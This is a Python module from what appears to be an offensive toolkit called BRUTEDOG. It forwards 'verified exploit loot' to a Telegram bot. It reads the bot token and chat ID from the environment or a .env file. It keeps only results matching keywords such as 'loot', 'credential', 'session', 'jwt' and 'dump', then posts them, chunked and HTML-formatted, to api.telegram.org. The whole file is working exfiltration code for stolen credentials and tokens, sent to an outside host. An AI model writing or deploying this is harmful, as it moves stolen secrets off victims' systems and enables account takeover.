#!/usr/bin/env python3
"""
TELEGRAM_NOTIFIER.PY v8.8 — Centralized Zero-Noise Telemetry & Alert Dispatcher
"""
import asyncio
import html
import json
import os
from pathlib import Path
from typing import Union

import httpx

BASE_DIR = Path(__file__).resolve().parent.parent


def _load_dotenv_value(key: str) -> str:
    env_path = BASE_DIR / ".env"
    if not env_path.exists():
        return ""
    try:
        for line in env_path.read_text(encoding="utf-8", errors="ignore").splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or "=" not in stripped:
                continue
            k, v = stripped.split("=", 1)
            if k.strip() == key:
                return v.strip().strip('"').strip("'")
    except Exception:
        pass
    return ""


def _resolve_config() -> tuple[str, str]:
    token = (
        os.getenv("TELEGRAM_BOT_TOKEN")
        or os.getenv("BRUTEDOG_TG_TOKEN")
        or _load_dotenv_value("TELEGRAM_BOT_TOKEN")
        or _load_dotenv_value("BRUTEDOG_TG_TOKEN")
        or ""
    ).strip()
    chat_id = (
        os.getenv("TELEGRAM_CHAT_ID")
        or os.getenv("BRUTEDOG_TG_CHAT")
        or _load_dotenv_value("TELEGRAM_CHAT_ID")
        or _load_dotenv_value("BRUTEDOG_TG_CHAT")
        or ""
    ).strip()
    return token, chat_id


HIGH_VALUE_KEYWORDS = [
    "critical",
    "bypass",
    "success",
    "loot",
    "token",
    "session",
    "admin",
    "credential",
    "compromised",
    "race",
    "pivot",
    "jwt",
    "dump",
]


def _escape_html(text: object) -> str:
    return html.escape(str(text))


async def send_telegram_alert(loot_type: str, details: Union[dict, str]):
    """
    Asynchronously dispatches verified high-value loot to Telegram.
    Enforces a strict zero-noise filter and chunks long messages safely.
    """
    bot_token, chat_id = _resolve_config()
    if not bot_token or not chat_id:
        return

    serialized_details = (
        json.dumps(details, indent=2, default=str)
        if isinstance(details, (dict, list))
        else str(details)
    )
    check_str = f"{loot_type} {serialized_details}".lower()
    if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
        return

    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    if isinstance(details, dict):
        lines = []
        for k, v in details.items():
            safe_key = _escape_html(k)
            safe_val = _escape_html(
                json.dumps(v, default=str) if isinstance(v, (dict, list)) else v
            )
            lines.append(f"• <b>{safe_key}</b>: <code>{safe_val}</code>")
        details_str = "\n".join(lines)
    else:
        details_str = f"<code>{_escape_html(serialized_details)}</code>"

    base_header = (
        "🚨 <b>BRUTEDOG V8.8 — VERIFIED EXPLOIT LOOT</b> 🚨\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>Vector:</b> <code>{_escape_html(str(loot_type).upper())}</code>\n\n"
    )
    footer = "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    full_message = base_header + details_str + footer

    max_chunk_size = 3800
    if len(full_message) > max_chunk_size:
        chunks = [details_str[i : i + max_chunk_size] for i in range(0, len(details_str), max_chunk_size)]
        messages = [
            (
                f"🚨 <b>BRUTEDOG V8.8 [Part {idx}/{len(chunks)}]</b> 🚨\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 <b>Vector:</b> <code>{_escape_html(str(loot_type).upper())}</code>\n\n"
                f"{chunk}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            for idx, chunk in enumerate(chunks, 1)
        ]
    else:
        messages = [full_message]

    try:
        async with httpx.AsyncClient(timeout=8.0) as client:
            for msg in messages:
                payload = {
                    "chat_id": chat_id,
                    "text": msg,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True,
                }
                await client.post(api_url, json=payload)
                if len(messages) > 1:
                    await asyncio.sleep(0.3)
    except Exception:
        pass
